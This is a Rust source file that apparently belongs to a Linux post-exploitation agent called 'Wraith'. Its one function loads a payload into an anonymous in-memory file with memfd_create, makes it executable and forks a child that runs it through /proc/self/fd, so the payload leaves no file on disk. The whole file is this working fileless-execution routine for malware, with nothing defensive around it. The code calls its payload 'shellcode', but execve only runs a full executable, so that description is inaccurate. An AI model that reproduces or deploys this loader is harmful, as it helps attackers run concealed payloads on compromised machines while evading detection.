use std::ffi::CString;
#[cfg(target_os = "linux")]
use std::ptr;

/// Linux shellcode injection using memfd_create and exec
/// This creates an anonymous file descriptor, writes shellcode to it, makes it executable, and runs it
#[cfg(target_os = "linux")]
pub fn inject_shellcode(shellcode: &[u8]) -> String {
    unsafe {
        // Create anonymous file descriptor
        let name = CString::new("sc").unwrap();
        let fd = libc::syscall(libc::SYS_memfd_create, name.as_ptr(), 0);
        
        if fd < 0 {
            return format!("memfd_create failed: {}", std::io::Error::last_os_error());
        }

        // Write shellcode to fd
        let written = libc::write(fd as i32, shellcode.as_ptr() as *const libc::c_void, shellcode.len());
        if written < 0 {
            libc::close(fd as i32);
            return format!("write failed: {}", std::io::Error::last_os_error());
        }

        // Make it executable
        if libc::fchmod(fd as i32, 0o700) < 0 {
            libc::close(fd as i32);
            return format!("fchmod failed: {}", std::io::Error::last_os_error());
        }

        // Create /proc/self/fd/N path
        let fd_path = format!("/proc/self/fd/{}", fd);
        let fd_path_c = CString::new(fd_path.clone()).unwrap();

        // Fork and execute
        let pid = libc::fork();
        
        match pid {
            -1 => {
                libc::close(fd as i32);
                format!("fork failed: {}", std::io::Error::last_os_error())
            }
            0 => {
                // Child process - exec the shellcode
                let args = [ptr::null::<libc::c_char>()];
                let env = [ptr::null::<libc::c_char>()];
                
                libc::execve(
                    fd_path_c.as_ptr(),
                    args.as_ptr(),
                    env.as_ptr(),
                );
                
                // If execve returns, it failed
                libc::_exit(1);
            }
            child_pid => {
                // Parent process
                libc::close(fd as i32);
                format!("Shellcode injected, PID: {}", child_pid)
            }
        }
    }
}

#[cfg(not(target_os = "linux"))]
compile_error!("Wraith is a Linux-only agent. Build with: cargo build --target=x86_64-unknown-linux-musl");
